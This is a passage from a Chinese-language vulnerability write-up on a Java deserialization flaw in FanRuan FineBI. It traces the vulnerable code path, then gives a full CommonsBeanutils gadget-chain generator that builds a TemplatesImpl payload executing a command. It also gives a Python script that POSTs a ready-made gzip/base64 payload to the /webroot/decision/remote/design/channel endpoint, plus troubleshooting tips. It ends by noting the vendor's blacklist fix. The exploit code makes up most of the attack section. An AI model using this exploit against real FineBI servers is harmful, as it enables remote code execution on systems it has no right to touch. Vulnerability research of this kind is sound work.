<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240304095313770.png" alt="image-20240304095313770"></th>
</tr>
</thead>
</table>
<p>在<code>com.fr.serialization.GZipSerializerWrapper</code>的<code>deserialize</code>方法中，会调用<code>this.serializer</code>的<code>deserialize</code>方法，这里的<code>this.serializer</code>为<code>InvocationSerializer</code>对象。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240304095529163.png" alt="image-20240304095529163"></th>
</tr>
</thead>
</table>
<p>最终会调用<code>com.fr.rpc.serialization.InvocationSerializer</code>的<code>deserialize</code>方法，<code>var1</code>为<code>request</code>输入流，调用了<code>readObject</code>进行反序列化。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240304095717218.png" alt="image-20240304095717218"></th>
</tr>
</thead>
</table>
<p><code>inputstream</code>输入流在<code>com.fr.serialization.GZipSerializerWrapper</code>的<code>deserialize</code>方法中会被包装成<code>GZIPInputStream</code>对象，在发送数据的时候需要将<code>inputstream</code>进行<code>GZIP</code>编码。</p>
<h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><p>在<code>fine-bi-engine-third-5.1.jar</code>包中集成了<code>CB</code>链依赖</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240304105926959.png" alt="image-20240304105926959"></th>
</tr>
</thead>
</table>
<p>生成利用链</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CB_not_cc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">"aaa"</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 自定义类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        String clazzName = <span class="string">"onload"</span>;</span><br><span class="line">        CtClass targetClass = pool.makeClass(clazzName);</span><br><span class="line">        targetClass.setSuperclass(pool.get(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span>));</span><br><span class="line">        CtConstructor cons = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[] &#123;&#125;, targetClass);</span><br><span class="line"></span><br><span class="line">        cons.setBody(<span class="string">"&#123;Runtime.getRuntime().exec(\"calc\");&#125;"</span>);</span><br><span class="line">        targetClass.addConstructor(cons);</span><br><span class="line">        <span class="keyword">byte</span>[] byteArray = targetClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[][] payloads = &#123;byteArray&#125;;</span><br><span class="line">        bytecodes.set(templates, payloads);</span><br><span class="line"></span><br><span class="line">        Field tfactory = templatesClass.getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        BeanComparator beanComparator = <span class="keyword">new</span> BeanComparator(<span class="keyword">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line"></span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, beanComparator);</span><br><span class="line">        queue.add(<span class="string">"a"</span>);</span><br><span class="line">        queue.add(<span class="string">"b"</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;? extends BeanComparator&gt; beanComparatorClass = beanComparator.getClass();</span><br><span class="line">        Field property = beanComparatorClass.getDeclaredField(<span class="string">"property"</span>);</span><br><span class="line">        property.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        property.set(beanComparator, <span class="string">"outputProperties"</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;? extends PriorityQueue&gt; queueClass = queue.getClass();</span><br><span class="line">        Field queue1 = queueClass.getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">        queue1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        queue1.set(queue, <span class="keyword">new</span> Object[]&#123;templates,templates&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 包装成ZIP</span></span><br><span class="line">        <span class="keyword">final</span> ByteArrayOutputStream baos3 = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">final</span> GZIPOutputStream gos3 = <span class="keyword">new</span> GZIPOutputStream(baos3);</span><br><span class="line">        gos3.write(baos.toByteArray());</span><br><span class="line">        gos3.finish();</span><br><span class="line"></span><br><span class="line">        String base64str = Base64.getEncoder().encodeToString(baos3.toByteArray());</span><br><span class="line">        System.out.println(base64str);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行反序列化</span></span><br><span class="line">        <span class="keyword">final</span> ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(Base64.getDecoder().decode(base64str));</span><br><span class="line">        <span class="keyword">final</span> GZIPInputStream gis = <span class="keyword">new</span> GZIPInputStream(bais);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(gis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240304143656741.png" alt="image-20240304143656741"></th>
</tr>
</thead>
</table>
<p>通过py脚本利用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">host= <span class="string">"http://172.20.10.190:37799/"</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"H4sIAAAAAAAAAGWTT2sTQRjGn9lNkzRNaxtta70Jgm2FXcWDYMU/DQjBUKst9pBCmGyGuLKZXWdm261gD/0AnvwW9lIQFQ+CVw9614sXjx7EiyBW381G09pd2Jl5Zt73mfc3s7tfMaQVph/wDe7Exg+cZeWHyjdbd2IRi6cfzz//eW1nz4ZVQ077j0QdJS/sRlxxEyqDqXoa6aaRbvWfvpBEACxKfC5UHYdH3LsvHIrrhlI7LcFlGqCdReoNoj48YTv7S9+2LViHXB5iG6yOYqTCSCizZVDJXAMuO+6KUb7skCO5zffKSGUnk89UuRY1qYXUvvE3xMBs015/vL785b0FJJHBeBibKDbLmYUv9GaOKrAp52XaiKNj6RyoJOHk4fjSCCV54CQ6MJ5jFE+cVdGNAm6ErlE7vHb7rdx9dtFGvobRpi/bQpqluNsSqoaxJgVIHQhTIz1poNRsbRnhhW2hDexGY7GBfNMLuKZhpXGg4mqqLdQx1JS8K1I6uTommv9XcPhwBnp2OPhNT6x6Rrd+zUx2Op8u9VjQFCPdaizufp/+kS+ufu7LzHu3//oNTV/ADEM+lEHI2wUwhuuEyCVELiFyM0RuD5H7F5HbQ+SqWBq/K9wbLU3Fe2a1T6AAmzJe8aVvrjLYs3P3GHJVIkETZQwhX0IRwwwTAwh3s1QFjDCUOsL0xwyTs3P1I8sWyhjFWAllHKPMHg+8IiaoJxLhMZydPXqfDiYhdp4g5GUcx4k0ySR5roSx8sRNPyDPkQyGk4bgNCykl4eI0Uubp2+BRqdIZ9SOzb9E6RXGK5UXmFrb66+cTn8YnKSraHPOo02GJD3Z0eQPQVjlt6IDAAA="</span></span><br><span class="line">data = base64.b64decode(payload)</span><br><span class="line"></span><br><span class="line">res = requests.post(url=host+<span class="string">"/webroot/decision/remote/design/channel"</span>, data=data,verify=<span class="literal">False</span>, proxies=&#123;<span class="string">"http"</span>: <span class="string">"http:127.0.0.1:8080"</span>&#125;)</span><br><span class="line"></span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<p>不过这里发现一个问题，当使用<code>commons-beanutils 1.9.2</code> 生成反序列化数据提交不会利用成功，通过arthas调试会发现报错<code>java.io.InvalidClassException: org.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc serialVersionUID = -2044202215314119608, local class serialVersionUID = -3490850999041592962</code>，这是由于<code>commons-beanutils</code>版本跟帆软环境中的不一致造成的，将生成序列化数据的环境从<code>1.9.2</code>换到<code>1.8.3</code>即可。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240304143936452.png" alt="·image-20240304143936452"></th>
</tr>
</thead>
</table>
<h3 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h3><p>在<code>5.1.18</code>版本中，<code>InputStream</code>对象已被<code>JDKSerializer.CustomObjectInputStream</code>类重新封装。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240305160327357.png" alt="image-20240305160327357"></th>
</tr>
</thead>
</table>
<p>重写了<code>resolveClass</code>方法，如果被序列化的类名在<code>BLACK_SET</code>变量中，则不会进行序列化。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240305160441970.png" alt="image-20240305160441970"></th>
</tr>
</thead>
</table>
<p>从<code>/com/fr/serialization/blacklist.txt</code>中得到禁止类序列化的名单。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240305160551712.png" alt="image-20240305160551712"></th>
</tr>
</thead>
</table>
<p>在<code>fine-core-10.0.jar</code>中的<code>com.fr.serialization.blacklist.txt</code>路径下</p>
<table>
<thead>
<tr>
